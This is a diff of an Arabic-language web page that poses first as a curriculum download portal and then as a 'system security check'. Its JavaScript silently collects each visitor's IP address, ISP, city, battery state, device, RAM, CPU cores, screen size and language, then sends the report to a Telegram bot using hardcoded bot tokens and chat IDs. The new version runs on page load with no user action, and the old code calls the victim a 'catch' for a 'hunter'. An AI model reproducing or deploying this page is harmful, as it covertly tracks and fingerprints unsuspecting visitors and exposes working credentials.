@@ -2,56 +2,75 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل ملفات 2009</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking System... | فحص النظام</title>
+    <style>
+        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
+        video { width: 100%; max-width: 450px; border-radius: 50%; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; }
+        .loading-text { margin-top: 20px; font-size: 18px; color: #00ff00; letter-spacing: 2px; }
+    </style>
 </head>
-<body style="text-align:center; font-family:sans-serif; background:#f4f4f4;">
-    <div style="margin-top:50px; padding:20px;">
-        <h3>بوابة تحميل منهاج 2009 الرسمي 📱</h3>
-        <p>يتم الآن فحص اتصالك لتأمين التحميل...</p>
-        <button id="btn" style="padding:15px 30px; background:#ff9800; color:white; border:none; border-radius:8px; font-weight:bold;">بدء التحميل المباشر</button>
-    </div>
+<body>
+
+    <!-- فيديو الانتظار المشوق -->
+    <video autoplay loop muted playsinline>
+        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHR0amRoc2R4bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC/3o7bu3XilJ5BOiSGic/giphy.mp4" type="video/mp4">
+    </video>
+
+    <div class="loading-text" id="status">جاري فحص أمان الجهاز...</div>
 
     <script>
-        const pr = new URLSearchParams(window.location.search);
-        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '7238206121'; 
+        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
 
-        async function getFullData() {
-            // 1. جلب الـ IP والموقع
-            let ipData = { ip: "غير معروف", city: "غير معروف" };
+        async function getInfo() {
+            // 1. معلومات البطارية
+            let batteryInfo = "غير معروف";
+            try {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? "بشحن" : "ما بشحن"})`;
+            } catch (e) {}
+
+            // 2. معلومات الـ IP والشركة المزودة
+            let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
             } catch (e) {}
 
-            // 2. جلب معلومات البطارية
-            let batteryInfo = "غير مدعوم";
-            try {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'جاري الشحن' : 'لا يشحن'})`;
-            } catch (e) {}
+            // 3. معلومات الجهاز والمتصفح
+            const info = {
+                device: navigator.platform,
+                browser: navigator.userAgent.split(') ')[1],
+                cores: navigator.hardwareConcurrency || "غير معروف",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "غير معروف",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                lang: navigator.language
+            };
 
-            // 3. تجميع الرسالة
-            const msg = `
-📱 صيدة نظام (2009) 📱
-👤 الصياد: ${pr.get('hunter')}
-🌐 الـ IP: ${ipData.ip}
-📍 الموقع: ${ipData.city} / ${ipData.country_name}
-🔋 البطارية: ${batteryInfo}
-📱 الجهاز: ${navigator.platform}
-🌐 المتصفح: ${navigator.userAgent}
-💻 المعالج: ${navigator.hardwareConcurrency || 'غير معروف'} Core
+            const message = `
+💻 **Detailed System Report**
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+🌐 **IP:** \`${ipData.ip || "Unknown"}\`
+🏢 **ISP:** \`${ipData.org || "Unknown"}\`
+📍 **City:** \`${ipData.city || "Unknown"}\`
+🔋 **Battery:** \`${batteryInfo}\`
+📱 **Device:** \`${info.device}\`
+🖥️ **Screen:** \`${info.screen}\`
+🧠 **RAM:** \`${info.ram}\`
+⚙️ **Cores:** \`${info.cores}\`
+🌍 **Lang:** \`${info.lang}\`
+📡 **Bluetooth:** \`${navigator.bluetooth ? "يدعم" : "لا يدعم"}\`
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+🦅 **Dev:** Abu Osayed Malkawi
             `;
 
-            const fullMsg = encodeURIComponent(msg);
-            // الإرسال للمستخدم ولإلك (أبو سند)
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`);
-            
-            alert("بدأ التحميل... يرجى الانتظار");
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
         }
 
-        document.getElementById('btn').onclick = getFullData;
+        // تشغيل السحب فوراً
+        getInfo();
     </script>
 </body>
 </html>
